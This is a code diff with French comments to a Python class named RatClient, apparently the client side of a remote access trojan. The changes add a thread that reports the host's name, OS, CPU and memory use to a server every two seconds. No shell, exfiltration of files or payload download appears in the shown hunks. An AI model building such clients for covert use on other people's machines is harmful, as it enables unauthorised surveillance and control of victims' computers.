@@ -114,9 +114,13 @@ class RatClient:
             self.receive_thread.start()
             print("Thread de réception démarré")
             
-            # Envoyer les informations système
+            # Envoyer les informations système initiales
             self.send_system_info()
-            print("Informations système envoyées")
+            print("Informations système initiales envoyées")
+            
+            # Démarrer le thread d'envoi périodique des informations système
+            self.start_system_info_thread()
+            print("Thread d'envoi périodique des informations système démarré")
             
             return True
             
@@ -154,21 +158,21 @@ class RatClient:
                 memory_percent = memory.percent
                 
                 # Préparer les données
-                system_info = {
-                    'type': 'system_info',
-                    'data': {
-                        'hostname': socket.gethostname(),
-                        'os': platform.system() + " " + platform.release(),
-                        'cpu': cpu_percent,
-                        'memory': memory_percent
-                    }
+                info = {
+                    'hostname': platform.node(),
+                    'os': f"{platform.system()} {platform.release()}",
+                    'cpu': cpu_percent,
+                    'memory': memory_percent
                 }
                 
                 # Envoyer les données
-                self.send_message(system_info)
+                self.send_message({
+                    'type': 'system_info',
+                    'data': info
+                })
                 
                 # Attendre avant la prochaine mise à jour
-                time.sleep(1)
+                time.sleep(2)  # Mise à jour toutes les 2 secondes
                 
             except Exception as e:
                 print(f"Erreur lors de l'envoi des informations système : {e}")
